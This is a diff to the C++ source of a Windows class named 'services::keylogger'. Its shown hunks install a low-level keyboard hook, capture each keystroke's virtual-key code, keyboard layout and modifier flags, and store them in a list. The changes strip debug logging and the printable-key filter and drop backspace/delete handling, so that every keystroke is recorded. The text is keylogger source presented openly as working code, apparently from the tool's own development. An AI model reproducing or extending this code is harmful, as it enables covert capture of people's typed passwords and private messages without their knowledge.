@@ -6,9 +6,7 @@ void services::keylogger::run()
 	{
 		return;
 	}
-#if _DEBUG
-	log = std::ofstream("LRClog.txt", std::ios::trunc);
-#endif
+
 	if (hhkLowLevelKybd == NULL)
 	{
 		hhkLowLevelKybd = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, NULL);
@@ -34,21 +32,15 @@ void services::keylogger::stop()
 		UnhookWindowsHookEx(hhkLowLevelMouse);
 		hhkLowLevelMouse = NULL;
 	}
-#if _DEBUG
-	log.close();
-#endif
+
 	isRunning = false;
 }
 
-void services::keylogger::processvk(VirtualKeyInfo vkInfo)
+void services::keylogger::processVirtualKey(VirtualKeyInfo vkInfo)
 {
-#if _DEBUG
-	log << "----------------" << std::endl;
-	log << "vkCode: " << vkInfo.vkCode << std::endl;
-	log << "lang: " << vkInfo.lang << std::endl;
-	log << "flags: " << vkInfo.flags << std::endl;
-#endif
-
+#if DEBUG
+	log << vkInfo.vkCode << std::endl;
+#endif // DEBUG
 	// Filter virtual-key repeats
 	if (vkcmp(vkInfo, lastKeyPressed))
 	{
@@ -67,14 +59,15 @@ void services::keylogger::processvk(VirtualKeyInfo vkInfo)
 		lastKeyPressed = vkInfo;
 	}
 
-	if (isprintable(vkInfo.vkCode))
-	{
-		VirtualKeyInfoList::iterator it = vkList.begin();
-		std::advance(vkList.begin(), vkListCursor);
+	//
+	// TODO: Perform range checks before inserting info vkList
+	//
 
-		// Insert virtual-key into vkList at cursor position
-		vkList.insert(it, vkInfo);
-	}
+	VirtualKeyInfoList::iterator it = vkList.begin();
+	std::advance(vkList.begin(), vkListCursor);
+
+	// Insert virtual-key into vkList at cursor position
+	vkList.insert(it, vkInfo);
 }
 
 void services::keylogger::onDelete()
@@ -108,17 +101,9 @@ void services::keylogger::clear()
 	vkList.clear();
 }
 
-inline bool services::keylogger::vkcmp(const VirtualKeyInfo vk1, const VirtualKeyInfo vk2)
+inline bool services::keylogger::vkcmp(VirtualKeyInfo vk1, VirtualKeyInfo vk2)
 {
 	return (vk1.vkCode == vk2.vkCode && vk1.lang == vk2.lang && vk1.flags == vk2.flags);
-}
-
-// Determines is virtual key adds text into text fields
-inline bool services::keylogger::isprintable(const DWORD vkCode)
-{
-	return (vkCode == VK_SPACE) // Nuff said
-		|| (vkCode >= 0x30 && vkCode <= 0x5A) // 0 - 9, A - Z
-		|| (vkCode >= 0x60 && vkCode <= 0x6F);// Numpad keys
 }
 
 LRESULT CALLBACK services::keylogger::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
@@ -129,12 +114,6 @@ LRESULT CALLBACK services::keylogger::LowLevelKeyboardProc(int nCode, WPARAM wPa
 
 		switch (dllHookStruct->vkCode)
 		{
-		case VK_BACK:
-			onBackspace();
-			break;
-		case VK_DELETE:
-			onDelete();
-			break;
 		case VK_UP:
 			// Point cursor to the start
 			vkListCursor = 0;
@@ -164,10 +143,10 @@ LRESULT CALLBACK services::keylogger::LowLevelKeyboardProc(int nCode, WPARAM wPa
 
 		VirtualKeyInfo vkInfo;
 		vkInfo.vkCode = dllHookStruct->vkCode;
-		vkInfo.lang = *(WORD*)(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL)));
+		vkInfo.lang = WORD(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL)));
 		vkInfo.flags = isShift && isCapsLock ? 0x3 : isShift ? 0x1 : isCapsLock ? 0x2 : 0x0;
 
-		processvk(vkInfo);
+		processVirtualKey(vkInfo);
 	}
 
 	return CallNextHookEx(hhkLowLevelKybd, nCode, wParam, lParam);
